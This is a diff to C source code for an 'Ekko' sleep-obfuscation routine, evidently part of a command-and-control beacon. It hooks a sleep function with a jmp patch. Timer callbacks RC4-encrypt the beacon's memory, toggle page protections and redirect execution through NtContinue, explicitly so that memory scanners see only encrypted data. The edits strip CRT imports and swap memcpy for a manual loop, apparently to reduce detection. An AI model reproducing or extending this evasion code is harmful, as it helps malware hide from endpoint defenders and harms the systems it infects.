@@ -26,8 +26,7 @@
 */
 
 #include <stdio.h>
-#include <string.h>
-#include <stdlib.h>
+
 
 /* ============================================================
    WINDOWS TYPES — manual definitions, no windows.h
@@ -296,6 +295,9 @@ void EkkoSleep(DWORD ms, PVOID bytes, ULONG len) {
          T4 (ms):    SystemFunction032 RC4 decrypt beacon memory
          T5 (ms):    VirtualProtect RW → RX
 
+         key generation: xorshift RNG seeded with GetTickCount ^ buffer address
+       new key per sleep cycle — not srand/rand
+
        memory scanner sees RC4-encrypted garbage during sleep.
        NtContinue with crafted CONTEXT redirects execution without
        a direct call — ROP-style dispatch via timer callbacks. */
@@ -365,7 +367,10 @@ int main(void) {
     pVP VP = (pVP)get_function_from("kernel32.dll", "VirtualProtect");
     DWORD old2;
     VP(sleep_func, 14, PAGE_READWRITE, &old2);
-    memcpy(sleep_func, jmp_patch, 14);
+    BYTE *dst = sleep_func;
+    BYTE *src = jmp_patch;
+    int _k;
+    for (_k = 0; _k < 14; _k++) dst[_k] = src[_k];
     VP(sleep_func, 14, old2, &old2);
     g_bytes = bytes;
     g_len   = (ULONG)len;
